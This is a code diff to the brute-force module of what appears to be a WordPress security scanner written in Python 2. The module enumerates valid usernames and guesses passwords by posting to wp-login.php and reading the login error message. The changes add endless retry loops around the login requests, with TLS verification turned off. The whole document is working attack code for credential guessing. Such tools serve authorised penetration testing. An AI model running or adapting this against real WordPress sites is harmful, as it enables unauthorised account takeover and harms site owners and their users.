@@ -5,7 +5,6 @@ import re
 import json
 import os
 import urllib
-import sys
 
 from core import *
 from wordpress import *
@@ -13,8 +12,6 @@ from thread_engine import ThreadEngine
 
 class Brute_Engine:
 	def __init__(self, wordpress, brute, usernames, users_list, passwords_list):
-		# bruteforce customs users passed in --brute
-		# ex: --brute admin,guest,foo
 		if brute:
 			if usernames:
 				users_to_brute = usernames.split(',')
@@ -69,7 +66,13 @@ class Brute_Engine:
 
 	def check_user(self, user, users_found, wordpress):
 		data = {"log":user, "pwd":"wordpresscan"}
-		html = requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text
+		while True:
+			try:
+				html = requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text
+			except:
+				print critical('ConnectionError in thread, retry...')
+				continue
+			break
 		# valid login -> the submited user is printed by WP
 		if '<div id="login_error">' in html and '<strong>%s</strong>' % user in html:
 			print info("User found "+ user)
@@ -101,7 +104,13 @@ class Brute_Engine:
 
 	def check_pass(self, user, pwd, wordpress, found):
 		data = {"log": user, "pwd": pwd}
-		html = requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text
+		while True:
+			try:
+				html = requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text
+			except:
+				print critical('ConnectionError in thread, retry...')
+				continue
+			break
 		if not '<div id="login_error">' in html:
 			print warning("Password found for {} : {}{}".format(user,pwd, ' '*100))
 			found[0] = True
